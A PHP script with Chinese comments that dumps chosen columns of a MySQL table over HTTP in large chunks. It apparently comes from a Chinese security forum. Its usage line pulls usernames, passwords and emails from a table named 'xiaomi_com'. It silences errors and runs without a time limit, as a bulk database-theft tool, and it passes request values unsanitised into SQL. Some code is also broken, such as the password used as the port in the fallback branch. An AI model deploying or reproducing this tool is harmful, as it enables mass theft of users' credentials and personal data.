<?php
//使用方法: wget "http://localhost/getsql.php?t='xiaomi_com'&f=username,password,email&s=0&e=2000000$l=5000" -O data.txt
//借鉴了 LCX Gavin 2大前辈的脚本.
//                LCX          [url=https://www.t00ls.net/thread-26740-1-1.html]https://www.t00ls.net/thread-26740-1-1.html[/url]
//                Gavin [url=https://www.t00ls.net/thread-26791-1-1.html]https://www.t00ls.net/thread-26791-1-1.html[/url]
//
 
        error_reporting(0);
        ignore_user_abort();
        set_time_limit(0);
        ob_clean();
 
        define('DB_HOST', '127.0.0.1');
        define('DB_PORT','3306');
        define('DB_NAME', 'thinkphp');
        define('DB_USER', 'root');
        define('DB_PASS', 'wanan');
        define('DB_CHAR', 'utf8');
 
        $type=class_exists('PDO')?'PDO':'MYSQL';
        $table=$_GET['t']?$_GET['t']:die('表名必须!');                                                //表名          必须 t      
        $limit_start=$_GET['s']?intval($_GET['s']):0;                                                //开始条数  可选 s 默认为0
        $limit_end=$_GET['e']?intval($_GET['e']):0;                                                        //结束条数  可选 e 默认为所有
        $limit_length=$_GET['l']?intval($_GET['l']):5000;                                        //分段条数  可选 l 默认为5000 
        $filed=$_GET['f']?$_GET['f']:'*';                                                                        //字段名         可选 f        用,分割没有则为全部字段 
 
        if($type=='PDO'){
                $dsn='mysql:host='.DB_HOST.';port='.DB_PORT.';dbname='.DB_NAME;
                $options = array(
                        PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES '.DB_CHAR,
                ); 
                try{
                                 $dbh = new PDO($dsn,DB_USER,DB_PASS,$options);
                }catch (PDOException $e) {
                        die('PDO ERROR!');
                }
                $sql='SELECT COUNT(-1) FROM `'.$table.'`;';
                $do=$dbh->query($sql);
                if($do){
                        $count=$do->fetch();
                }else{
                        die('PDO COUNT ERROR');
                }
                $limit_end=($limit_end)?$limit_end:$count[0];
                $limit_end=$limit_end-$limit_start;
                $limit_length=$limit_end>$limit_length?$limit_length:$limit_end;
                $section=ceil($limit_end/$limit_length);
                if (ob_get_level() == 0){
                                ob_start();                                        
                }else{
                                die('PDO ERROR');
                }
                for($i=0;$i<$section;$i++){
                        $sql='SELECT '.$filed.' FROM  '.$table.' LIMIT '.($limit_start+1+$i*$limit_length).','.$limit_length.';';
                        $s=$dbh->query($sql);
                        $arr=$s->fetchALL(PDO::FETCH_ASSOC);
                        foreach ($arr as $value) {
                                echo(implode('        ', $value)."\n");
                        }
                        ob_end_flush();
                }
 
        }else{
                $link=mysql_connect(DB_HOST.':'.DB_PASS,DB_USER,DB_PASS);
                if($link){
                        mysql_select_db(DB_NAME,$link);
                        mysql_query('SET NAMES '.DB_CHAR);
                        $sql='SELECT COUNT(-1) FROM `'.$table.'`;';
                        $count=mysql_fetch_array(mysql_query($sql));
                        $limit_end=($limit_end)?$limit_end:$count[0];
                        $limit_end=$limit_end-$limit_start;
                        $limit_length=$limit_end>$limit_length?$limit_length:$limit_end;
                        $section=ceil($limit_end/$limit_length);
                        if (ob_get_level() == 0){
                                ob_start();                                        
                        }else{
                                die('MYSQL ERROR');
                        }
                        for($i=0;$i<$section;$i++){
                                $sql='SELECT '.$filed.' FROM  '.$table.' LIMIT '.($limit_start+1+$i*$limit_length).','.$limit_length.';';
                                $a=mysql_query($sql);
                                if($b=mysql_fetch_row($a)){
                                        do{
                                                echo(implode('        ', $b)."\n");
                                        }while($b=mysql_fetch_row($a));
                                }
                                ob_end_flush();
                        }
                }else{
                        die('MYSQL ERROR!');
                }
 
        }
         
 
        ?>